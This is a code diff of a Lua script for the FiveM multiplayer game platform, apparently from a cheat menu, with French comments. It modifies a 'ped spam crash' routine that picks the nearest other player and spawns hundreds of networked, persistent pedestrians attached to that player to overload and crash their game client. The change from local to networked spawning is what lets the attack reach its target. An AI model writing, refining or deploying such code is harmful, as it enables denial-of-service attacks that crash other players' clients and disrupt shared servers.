@@ -1997,9 +1997,9 @@ AddEventHandler("CarryPeople:syncTarget",function() if Vars.Script.blockbeingcar
 
 -- ============================================================
 -- THREAD PED SPAM CRASH [E]
--- Spawne 300 peds locaux autour du joueur cible
--- Invisible pour toi, surcharge son client = crash
--- CreatePed false/false = local uniquement, pas synchronise
+-- Methode: CreatePed true/true = synchronise au reseau
+-- Les peds apparaissent chez la cible et surchargent son client
+-- On les teleporte sur lui en boucle pour maximiser la charge
 -- ============================================================
 
 _G._ZeySpawnedPeds = {}
@@ -2016,7 +2016,6 @@ Citizen.CreateThread(function()
                 spamCooldown = true
                 local myPed = PlayerPedId()
                 local myC   = GetEntityCoords(myPed)
-                -- Joueur humain le plus proche
                 local bestPid, bestDist = nil, math.huge
                 for _, pid in ipairs(GetActivePlayers()) do
                     if pid ~= PlayerId() then
@@ -2031,54 +2030,72 @@ Citizen.CreateThread(function()
                     MachoMenuNotification("Ped Spam","Lancement sur "..GetPlayerName(bestPid).."...")
                     Citizen.CreateThread(function()
                         local models = {
-                            GetHashKey("franklin"), GetHashKey("michael"),
-                            GetHashKey("trevor"),   GetHashKey("a_m_y_hipster_01"),
-                            GetHashKey("a_m_m_business_01"), GetHashKey("a_f_y_beach_01"),
-                            GetHashKey("s_m_y_cop_01"),      GetHashKey("s_m_y_swat_01"),
+                            GetHashKey("franklin"),
+                            GetHashKey("michael"),
+                            GetHashKey("trevor"),
+                            GetHashKey("a_m_y_hipster_01"),
+                            GetHashKey("a_m_m_business_01"),
+                            GetHashKey("a_f_y_beach_01"),
+                            GetHashKey("s_m_y_cop_01"),
+                            GetHashKey("s_m_y_swat_01"),
                         }
-                        -- Charger tous les modeles d abord
+                        -- Charger les modeles
                         for _, h in ipairs(models) do RequestModel(h) end
-                        Citizen.Wait(600)
-                        -- Attendre que tous soient charges
                         local waited = 0
-                        while waited < 30 do
-                            local allLoaded = true
+                        while waited < 40 do
+                            local ok = true
                             for _, h in ipairs(models) do
-                                if not HasModelLoaded(h) then allLoaded=false; break end
+                                if not HasModelLoaded(h) then ok=false; break end
                             end
-                            if allLoaded then break end
+                            if ok then break end
                             Citizen.Wait(100); waited=waited+1
                         end
+
                         _G._ZeySpawnedPeds = {}
                         local targetPed = GetPlayerPed(bestPid)
-                        -- 6 vagues de 50 = 300 peds
-                        for batch = 1, 6 do
+
+                        -- Spawner les peds en reseau (true/true) = ils existent chez la cible
+                        -- On les place exactement sur lui pour forcer son client a les charger
+                        for batch = 1, 8 do
                             if not DoesEntityExist(targetPed) then break end
                             local tc = GetEntityCoords(targetPed)
-                            for i = 1, 50 do
-                                local ox = (math.random() - 0.5) * 1.0
-                                local oy = (math.random() - 0.5) * 1.0
+                            for i = 1, 40 do
                                 local hash = models[math.random(1, #models)]
-                                -- false/false = non reseau, local uniquement
+                                -- true/true = synchronise au reseau = visible chez la cible
                                 local ped = CreatePed(4, hash,
-                                    tc.x+ox, tc.y+oy, tc.z,
-                                    math.random(0,360), false, false)
+                                    tc.x + (math.random()-0.5)*0.2,
+                                    tc.y + (math.random()-0.5)*0.2,
+                                    tc.z,
+                                    math.random(0,360),
+                                    true,  -- networked
+                                    true   -- mission ped = persiste
+                                )
                                 if DoesEntityExist(ped) then
+                                    -- Rendre invisible cote notre client seulement
                                     SetEntityVisible(ped, false, false)
                                     SetEntityAlpha(ped, 0, false)
                                     SetEntityCollision(ped, false, false)
                                     FreezeEntityPosition(ped, true)
-                                    SetPedRandomComponentVariation(ped, 0)
+                                    -- Forcer le ped a rester colle sur la cible
+                                    AttachEntityToEntity(ped, targetPed,
+                                        0, 0, 0, 0, 0, 0, 0,
+                                        false, false, false, false, 0, true)
                                     table.insert(_G._ZeySpawnedPeds, ped)
                                 end
                             end
-                            Citizen.Wait(80)
+                            Citizen.Wait(50)
                         end
-                        MachoMenuNotification("Ped Spam",GetPlayerName(bestPid).." devrait crash ! ("..#_G._ZeySpawnedPeds.." peds)")
-                        -- Nettoyage auto apres 30s
-                        Citizen.Wait(30000)
+
+                        local count = #_G._ZeySpawnedPeds
+                        MachoMenuNotification("Ped Spam", GetPlayerName(bestPid).." crash imminent ! ("..count.." peds reseau)")
+
+                        -- Nettoyage apres 20s
+                        Citizen.Wait(20000)
                         for _, p in ipairs(_G._ZeySpawnedPeds) do
-                            if DoesEntityExist(p) then DeleteEntity(p) end
+                            if DoesEntityExist(p) then
+                                DetachEntity(p, true, true)
+                                DeleteEntity(p)
+                            end
                         end
                         _G._ZeySpawnedPeds = {}
                         spamCooldown = false
